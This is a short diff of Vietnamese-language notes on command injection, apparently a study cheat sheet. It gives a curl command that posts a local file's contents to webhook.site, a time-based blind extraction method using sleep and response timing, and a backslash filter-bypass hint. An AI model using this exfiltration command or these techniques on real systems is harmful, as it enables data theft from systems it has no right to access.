@@ -20,3 +20,4 @@
 #### để dọi được file ra bên ngoài dùng curl -d @duong_dan_file https://webhook.site
 # Time-Base
 #### dùng thời gian (sleep để burte force) trong python thư viên request có elapsed
+#### trong linux dấu blackslash (\) không có tác dụng 
